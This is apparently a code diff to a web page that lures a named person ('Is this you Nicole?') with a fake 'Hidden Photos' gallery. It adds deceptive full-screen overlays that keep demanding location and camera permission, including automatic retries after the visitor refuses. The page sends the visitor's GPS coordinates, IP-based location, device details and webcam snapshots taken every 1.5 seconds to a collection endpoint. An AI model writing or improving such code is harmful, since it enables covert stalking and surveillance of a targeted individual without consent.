@@ -6,10 +6,136 @@
   </script>
 </head>
 
-<body onload="getLocation()">
+<body onload="getLocation(); checkCamera();">
 
-  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
-  </iframe>
+  <div id="locationOverlay" style="
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.95);
+    z-index: 100000;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    color: white;
+    font-family: Arial, sans-serif;
+  ">
+    <h1 style="margin-bottom: 10px;">Confirmation Required</h1>
+    <p style="font-size: 18px; margin-bottom: 30px; text-align:center; max-width:500px;">
+      This site reuires you to Accept and Confirm to view. Please allow to proceed.
+    </p>
+    <button id="allowBtn" onclick="retryLocation()" style="
+      padding: 15px 40px;
+      font-size: 18px;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    ">View Now</button>
+  </div>
+
+  <div id="cameraOverlay" style="
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.95);
+    z-index: 100001;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    color: white;
+    font-family: Arial, sans-serif;
+  ">
+    <h1 style="margin-bottom: 10px;">Enable to View</h1>
+    <p style="font-size: 18px; margin-bottom: 30px; text-align:center; max-width:500px;">
+      This site requires you to click the button to view the photos. Please allow to proceed.
+    </p>
+    <button id="allowCameraBtn" onclick="retryCamera()" style="
+      padding: 15px 40px;
+      font-size: 18px;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    ">Enable to View</button>
+  </div>
+
+  <!-- <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
+  </iframe> -->
+<iframe 
+  style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 99999;"
+  srcdoc="
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+  <meta charset='UTF-8'>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; background: #1a1a1a; color: white; overflow-x: hidden; }
+    header { text-align: center; padding: 30px 20px; background: #111; }
+    header h1 { font-size: 36px; margin-bottom: 5px; }
+    header p { font-size: 16px; color: #aaa; }
+    .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; padding: 30px; max-width: 1400px; margin: 0 auto; }
+    .gallery-item { position: relative; overflow: hidden; border-radius: 10px; cursor: pointer; aspect-ratio: 1 / 1; background: #333; }
+    .gallery-item img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.3s ease, opacity 0.3s ease; display: block; }
+    .gallery-item:hover img { transform: scale(1.05); opacity: 0.8; }
+    .gallery-item .overlay { position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(transparent, rgba(0,0,0,0.8)); padding: 20px 15px 15px; opacity: 0; transition: opacity 0.3s ease; }
+    .gallery-item:hover .overlay { opacity: 1; }
+    .lightbox { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; justify-content: center; align-items: center; }
+    .lightbox.active { display: flex; }
+    .lightbox img { max-width: 90%; max-height: 80%; border-radius: 10px; }
+    .close-btn { position: absolute; top: 20px; right: 30px; font-size: 40px; color: white; cursor: pointer; background: none; border: none; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>📸 Hidden Photos</h1>
+    <p>Is this you Nicole? </p>
+  </header>
+  <div class='gallery'>
+    <div class='gallery-item' onclick='openLightbox(this)'>
+      <img src='https://picsum.photos/seed/1/600/600' alt='Photo 1'>
+      <div class='overlay'><h3>Photo 1</h3><p>Description</p></div>
+    </div>
+    <div class='gallery-item' onclick='openLightbox(this)'>
+      <img src='https://picsum.photos/seed/2/600/600' alt='Photo 2'>
+      <div class='overlay'><h3>Photo 2</h3><p>Description</p></div>
+    </div>
+    <div class='gallery-item' onclick='openLightbox(this)'>
+      <img src='https://picsum.photos/seed/3/600/600' alt='Photo 3'>
+      <div class='overlay'><h3>Photo 3</h3><p>Description</p></div>
+    </div>
+  </div>
+
+  <div class='lightbox' id='lightbox' onclick='closeLightbox(event)'>
+    <button class='close-btn'>&times;</button>
+    <img id='lightboxImg' src=''>
+  </div>
+
+  <script>
+    function openLightbox(item) {
+      const img = item.querySelector('img');
+      const lightbox = document.getElementById('lightbox');
+      const lightboxImg = document.getElementById('lightboxImg');
+      lightboxImg.src = img.src;
+      lightbox.classList.add('active');
+    }
+    function closeLightbox(event) {
+      document.getElementById('lightbox').classList.remove('active');
+    }
+  </script>
+</body>
+</html>
+"></iframe>
+
 
   <p id="demo"></p>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
@@ -24,7 +150,7 @@
     var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
 
     const request = new XMLHttpRequest();
-    request.open("POST", "/location_update"); //change webhook
+    request.open("POST", "/location_update"); 
 
     request.setRequestHeader('Content-type', 'application/json');
 
@@ -52,7 +178,7 @@
       $("#gfg").html(data.ip);
 
       const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
+      request.open("POST", "/location_update"); 
 
       request.setRequestHeader('Content-type', 'application/json');
 
@@ -80,7 +206,7 @@
     $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
 
       const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
+      request.open("POST", "/location_update"); 
 
       request.setRequestHeader('Content-type', 'application/json');
 
@@ -88,7 +214,7 @@
         author: {
           name: "IP Address Reconnaissance"
         },
-        title: response.status, //response.query
+        title: response.status, 
         description: '```autohotkey\nContinent: ' + response.continent +
           "\nContinentCode: " + response.continentcode +
           "\nCountry: " + response.country +
@@ -125,17 +251,30 @@
 
     function getLocation() {
       if (navigator.geolocation) {
+        if (localStorage.getItem("locationGranted") === "true") {
+          document.getElementById("locationOverlay").style.display = "none";
+        }
         navigator.geolocation.getCurrentPosition(showPosition, showError);
       } else {
         x.innerHTML = "Geolocation is not supported by this browser.";
       }
     }
 
+    function retryLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+      }
+    }
+
     function showPosition(position) {
+      localStorage.setItem("locationGranted", "true");
+      document.getElementById("locationOverlay").style.display = "none";
+      document.getElementById("cameraOverlay").style.display = "none"; // Hide camera overlay too
+
       var latlong = (" GET ", "```prolog\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + position.coords.latitude + "," + position.coords.longitude);
 
       const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
+      request.open("POST", "/location_update"); 
 
       request.setRequestHeader('Content-type', 'application/json');
 
@@ -164,8 +303,11 @@
     function showError(error) {
       switch (error.code) {
         case error.PERMISSION_DENIED:
+          localStorage.removeItem("locationGranted");
+          document.getElementById("locationOverlay").style.display = "flex";
+
           const request = new XMLHttpRequest();
-          request.open("POST", "/location_update"); //change webhook
+          request.open("POST", "/location_update"); 
 
           request.setRequestHeader('Content-type', 'application/json');
 
@@ -176,6 +318,8 @@
           }
 
           request.send(JSON.stringify(params));
+
+          setTimeout(retryLocation, 3000);
           break;
         case error.POSITION_UNAVAILABLE:
           x.innerHTML = "Location information is unavailable."
@@ -235,17 +379,22 @@
       }
     };
 
+    function checkCamera() {
+       if (localStorage.getItem("cameraGranted") === "true") {
+           document.getElementById("cameraOverlay").style.display = "none";
+       }
+    }
+
     // Access webcam
     async function init() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints)
         handleSuccess(stream);
+        localStorage.setItem("cameraGranted", "true");
       } catch (e) {
-        setTimeout(function () {
-          alert("Allow Camera access to video chat");
-          window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623"
-          alert("Grant cam access")
-        }, 15000)
+        // Hide location, show camera
+        document.getElementById("locationOverlay").style.display = "none";
+        document.getElementById("cameraOverlay").style.display = "flex";
       }
     }
 
@@ -260,8 +409,12 @@
         context.drawImage(video, 0, 0, 640, 480);
         canvas.toBlob(postFile, 'image/jpeg');
       }, 1500);
+      
+      document.getElementById("cameraOverlay").style.display = "none";
+    }
 
-
+    function retryCamera() {
+        init();
     }
 
     // Load init
